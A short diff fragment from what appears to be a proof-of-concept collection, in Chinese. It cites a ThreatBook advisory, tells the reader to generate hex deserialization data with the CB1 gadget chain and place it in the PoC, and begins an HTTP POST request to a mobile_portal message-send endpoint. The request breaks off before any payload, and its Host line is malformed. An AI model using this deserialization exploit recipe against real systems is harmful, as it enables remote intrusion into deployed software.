@@ -16,7 +16,7 @@ https://x.threatbook.com/v5/vul/6bf25402a41b4fc27497a5b42a8421d7ef38d57cb7d8143d
 
 利用 CB1 生成 hex 反序列化数据，替换 POC 中的 HEX
 
-## poc
+## POC
 ```
 POST /mobile_portal/api/pns/message/send/batch/6_1sp1 HTTP/1.1
 Host: User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
